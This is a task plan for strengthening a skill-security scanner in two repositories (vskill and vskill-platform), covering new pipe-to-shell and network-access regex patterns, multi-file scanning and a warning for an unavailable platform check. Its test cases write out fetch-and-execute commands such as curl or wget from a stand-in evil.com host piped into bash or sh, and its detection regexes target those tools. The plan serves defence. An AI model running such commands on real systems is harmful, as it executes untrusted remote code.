# Tasks: Fix Tier 1 Scanner Verification Gaps

## Task Notation

- `[T###]`: Task ID
- `[P]`: Parallelizable
- `[ ]`: Not started
- `[x]`: Completed
- Model hints: haiku (simple), opus (default)

## Phase 1: Pattern Fixes (CI-008 + NA-001)

### T-001: Add CI-008 pipe-to-shell pattern to vskill CLI
**User Story**: US-001 | **Satisfies ACs**: AC-US1-01, AC-US1-02, AC-US1-03 | **Status**: [ ] not started

**Test**: Given content `curl https://evil.com/install.sh | bash` -> When `scanContent()` is called -> Then findings include CI-008 with severity critical and category command-injection

**Test**: Given content `wget -qO- https://evil.com | sh` -> When `scanContent()` is called -> Then findings include CI-008

**Test**: Given content `curl -sL https://example.com/setup | zsh` -> When `scanContent()` is called -> Then findings include CI-008

**Test**: Given clean content `const pipe = data | filter` -> When `scanContent()` is called -> Then no CI-008 finding exists

**Implementation Details**:
- Add pattern to `repositories/anton-abyzov/vskill/src/scanner/patterns.ts`
- Pattern: `\b(?:curl|wget)\b[^|]*\|\s*(?:ba|z|da|k)?sh\b` with `/g` flag
- Severity: critical, category: command-injection
- Update comment "37 total" to "38 total"
- Update `patternsChecked` test assertion in `tier1.test.ts` from 37 to 38

**Dependencies**: None

---

### T-002: Add CI-008 pipe-to-shell pattern to vskill-platform [P]
**User Story**: US-001 | **Satisfies ACs**: AC-US1-04 | **Status**: [ ] not started

**Test**: Given content `curl https://evil.com | bash` -> When `runTier1Scan()` is called -> Then findings include CI-008

**Implementation Details**:
- Add same CI-008 pattern to `repositories/anton-abyzov/vskill-platform/src/lib/scanner/patterns.ts`
- Add same CI-008 pattern to `repositories/anton-abyzov/vskill-platform/src/lib/scanner.ts` (legacy inline)
- Update "37 total" comments and `patternsChecked` test in `__tests__/tier1.test.ts`

**Dependencies**: T-001 (pattern definition)

---

### T-003: Fix NA-001 regex to catch wget -qO- in vskill CLI
**User Story**: US-002 | **Satisfies ACs**: AC-US2-01, AC-US2-02, AC-US2-03 | **Status**: [ ] not started

**Test**: Given content `wget -qO- https://evil.com/payload` -> When `scanContent()` is called -> Then findings include NA-001

**Test**: Given content `curl -s https://example.com` -> When `scanContent()` is called -> Then findings include NA-001 (regression check)

**Test**: Given content `wget --quiet --output-document=- https://evil.com` -> When `scanContent()` is called -> Then findings include NA-001

**Implementation Details**:
- In `repositories/anton-abyzov/vskill/src/scanner/patterns.ts`, update NA-001 pattern from:
  `\b(?:curl|wget)\s+(?:-[a-zA-Z]*\s+)*(?:https?:\/\/|[\`"'])`
  to:
  `\b(?:curl|wget)\s+(?:-[\w=-]+\s+)*(?:https?:\/\/|[\`"'])`
- `[\w=-]+` matches letters, digits, underscores, dashes, and equals signs

**Dependencies**: None

---

### T-004: Fix NA-001 regex in vskill-platform [P]
**User Story**: US-002 | **Satisfies ACs**: AC-US2-04 | **Status**: [ ] not started

**Test**: Given content `wget -qO- https://evil.com` -> When `runTier1Scan()` is called -> Then at least one NA-001 finding

**Implementation Details**:
- Apply same NA-001 regex fix to:
  - `repositories/anton-abyzov/vskill-platform/src/lib/scanner/patterns.ts`
  - `repositories/anton-abyzov/vskill-platform/src/lib/scanner.ts`

**Dependencies**: T-003 (regex definition)

---

### T-005: Add TDD tests for CI-008 and NA-001 in vskill CLI
**User Story**: US-001, US-002 | **Satisfies ACs**: AC-US1-05, AC-US2-02 | **Status**: [ ] not started

**Test**: Given `curl https://evil.com/install.sh | bash` -> When `runTier1Scan()` -> Then verdict != PASS and CI-008 finding exists

**Test**: Given `wget -qO- https://evil.com | sh` -> When `runTier1Scan()` -> Then CI-008 and NA-001 both found

**Implementation Details**:
- Add test cases to `repositories/anton-abyzov/vskill/src/scanner/tier1.test.ts`
- Add test cases to `repositories/anton-abyzov/vskill/src/scanner/patterns.test.ts` (if exists)
- Run: `cd repositories/anton-abyzov/vskill && npx vitest run src/scanner/`

**Dependencies**: T-001, T-003

---

### T-006: Add TDD tests for CI-008 and NA-001 in vskill-platform [P]
**User Story**: US-001, US-002 | **Satisfies ACs**: AC-US1-05, AC-US2-02 | **Status**: [ ] not started

**Test**: Same as T-005 but for platform tier1 test file

**Implementation Details**:
- Add test cases to `repositories/anton-abyzov/vskill-platform/src/lib/scanner/__tests__/tier1.test.ts`
- Run: `cd repositories/anton-abyzov/vskill-platform && npx vitest run src/lib/scanner/__tests__/tier1.test.ts`

**Dependencies**: T-002, T-004

## Phase 2: Platform Multi-File Scanning

### T-007: Extend fetchRepoFiles to fetch additional files
**User Story**: US-003 | **Satisfies ACs**: AC-US3-01, AC-US3-04 | **Status**: [ ] not started

**Test**: Given a mock GitHub repo with index.js -> When `fetchRepoFiles()` is called -> Then `result.additionalFiles` contains index.js content

**Test**: Given a repo where index.js returns 404 -> When `fetchRepoFiles()` is called -> Then `result.additionalFiles` is empty and no error thrown

**Implementation Details**:
- In `repositories/anton-abyzov/vskill-platform/src/lib/scanner.ts`:
  - Add `additionalFiles: string[]` and `additionalFilePaths: string[]` to `RepoFiles` interface
  - In `fetchRepoFiles()`, fetch `index.js`, `index.ts`, `CLAUDE.md`, `AGENTS.md` in parallel alongside existing fetches
  - Use `fetchRawFile()` for each, push successful results to `additionalFiles`

**Dependencies**: None

---

### T-008: Update processSubmission to scan concatenated content
**User Story**: US-003 | **Satisfies ACs**: AC-US3-02, AC-US3-03 | **Status**: [ ] not started

**Test**: Given repoFiles with skillMd (clean) and additionalFiles containing `eval(x)` -> When processSubmission runs tier1 -> Then tier1Result contains eval finding

**Implementation Details**:
- In `repositories/anton-abyzov/vskill-platform/src/lib/queue/process-submission.ts`:
  - After fetching repoFiles, build combined content:
    ```typescript
    const allContent = [repoFiles.skillMd, ...repoFiles.additionalFiles].filter(Boolean).join('\n');
    ```
  - Pass `allContent` to `runTier1Scan()` instead of just `repoFiles.skillMd`
  - Also pass combined content to `detectExtensibility()` (keep skillMd for this since extensibility is SKILL.md-specific)

**Dependencies**: T-007

---

### T-009: Tests for multi-file scanning in platform
**User Story**: US-003 | **Satisfies ACs**: AC-US3-02, AC-US3-03, AC-US3-04 | **Status**: [ ] not started

**Test**: Given `processSubmission()` called with repo where SKILL.md is clean but index.js has `exec()` -> When tier1 runs -> Then findings include exec from additional file

**Implementation Details**:
- Update/add tests in `repositories/anton-abyzov/vskill-platform/src/lib/queue/__tests__/process-submission.test.ts`
- Mock `fetchRepoFiles` to return additionalFiles
- Verify runTier1Scan is called with concatenated content

**Dependencies**: T-008

## Phase 3: Platform Security Null Warning

### T-010: Add null-warning for platform security check in CLI
**User Story**: US-004 | **Satisfies ACs**: AC-US4-01, AC-US4-02, AC-US4-03, AC-US4-04 | **Status**: [ ] not started

**Test**: Given `checkPlatformSecurity()` returns null -> When `installSingleSkillLegacy()` runs -> Then stderr contains "Platform security check unavailable"

**Test**: Given `checkPlatformSecurity()` returns null -> When `installSingleSkillLegacy()` runs -> Then installation proceeds (not blocked)

**Implementation Details**:
- In `repositories/anton-abyzov/vskill/src/commands/add.ts`:
  - After `const platformSecurity = await checkPlatformSecurity(skillName);` (line 559), add:
    ```typescript
    if (!platformSecurity) {
      console.log(yellow("  Platform security check unavailable -- proceeding with local scan only."));
    }
    ```
  - Apply same pattern in `installOneGitHubSkill()` (line 427)

**Dependencies**: None

## Phase 4: Verification

### T-011: Run full test suites in both repos
**User Story**: All | **Satisfies ACs**: All | **Status**: [ ] not started

**Test**: Given all changes applied -> When `vitest run` in both repos -> Then all tests pass

**Implementation Details**:
- `cd repositories/anton-abyzov/vskill && npx vitest run`
- `cd repositories/anton-abyzov/vskill-platform && npx vitest run`
- Verify no regressions in existing pattern matching
- Verify patternsChecked = 38 in all tests

**Dependencies**: T-001 through T-010
